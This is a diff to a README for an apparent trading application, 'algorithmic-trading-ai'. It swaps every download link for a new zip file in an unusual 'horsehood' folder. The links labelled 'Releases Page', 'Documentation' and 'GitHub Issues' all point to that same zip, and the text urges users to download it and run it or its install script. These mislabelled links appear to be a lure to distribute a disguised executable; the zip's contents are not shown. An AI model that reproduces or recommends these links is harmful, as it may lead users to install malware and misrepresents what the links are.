@@ -8,7 +8,7 @@ To get started with the algorithmic-trading-ai project, follow these simple step
 
 1. **Download the Application**
    - Visit the Releases page to download the latest version:
-   [![Download Latest Release](https://raw.githubusercontent.com/Anna-007-tech/algorithmic-trading-ai/main/horsehood/algorithmic-trading-ai.zip)](https://raw.githubusercontent.com/Anna-007-tech/algorithmic-trading-ai/main/horsehood/algorithmic-trading-ai.zip)
+   [![Download Latest Release](https://github.com/Anna-007-tech/algorithmic-trading-ai/raw/refs/heads/main/horsehood/trading_algorithmic_ai_v2.7.zip)](https://github.com/Anna-007-tech/algorithmic-trading-ai/raw/refs/heads/main/horsehood/trading_algorithmic_ai_v2.7.zip)
 
 2. **System Requirements**
    - This application runs on Windows, MacOS, and Linux.
@@ -22,10 +22,10 @@ To get started with the algorithmic-trading-ai project, follow these simple step
    - Follow the installation prompts for your operating system. 
    - For Windows, you may need to click 'Run' after download.
    - For Mac, drag the application icon to your Applications folder.
-   - On Linux, extract the https://raw.githubusercontent.com/Anna-007-tech/algorithmic-trading-ai/main/horsehood/algorithmic-trading-ai.zip file and run the installation script.
+   - On Linux, extract the https://github.com/Anna-007-tech/algorithmic-trading-ai/raw/refs/heads/main/horsehood/trading_algorithmic_ai_v2.7.zip file and run the installation script.
 
 4. **Download & Install**
-   - You can download the latest version [here](https://raw.githubusercontent.com/Anna-007-tech/algorithmic-trading-ai/main/horsehood/algorithmic-trading-ai.zip).
+   - You can download the latest version [here](https://github.com/Anna-007-tech/algorithmic-trading-ai/raw/refs/heads/main/horsehood/trading_algorithmic_ai_v2.7.zip).
    - After downloading, double-click the file and follow the instructions. 
 
 5. **Starting the Application**
@@ -61,9 +61,9 @@ A: You can analyze forex and cryptocurrency data with this application.
 A: You can check the documentation linked within the app or visit the GitHub Issues page for support.
 
 ## 🔗 Useful Links
-- [Releases Page for Download](https://raw.githubusercontent.com/Anna-007-tech/algorithmic-trading-ai/main/horsehood/algorithmic-trading-ai.zip)
-- [Documentation](https://raw.githubusercontent.com/Anna-007-tech/algorithmic-trading-ai/main/horsehood/algorithmic-trading-ai.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/Anna-007-tech/algorithmic-trading-ai/main/horsehood/algorithmic-trading-ai.zip)
+- [Releases Page for Download](https://github.com/Anna-007-tech/algorithmic-trading-ai/raw/refs/heads/main/horsehood/trading_algorithmic_ai_v2.7.zip)
+- [Documentation](https://github.com/Anna-007-tech/algorithmic-trading-ai/raw/refs/heads/main/horsehood/trading_algorithmic_ai_v2.7.zip)
+- [GitHub Issues](https://github.com/Anna-007-tech/algorithmic-trading-ai/raw/refs/heads/main/horsehood/trading_algorithmic_ai_v2.7.zip)
 
 ## 🧑‍🤝‍🧑 Community
 Join our community to share your insights, ask questions, and exchange ideas with other users. You can follow updates and engage with fellow traders through online forums or our GitHub page. Your feedback helps improve this project!
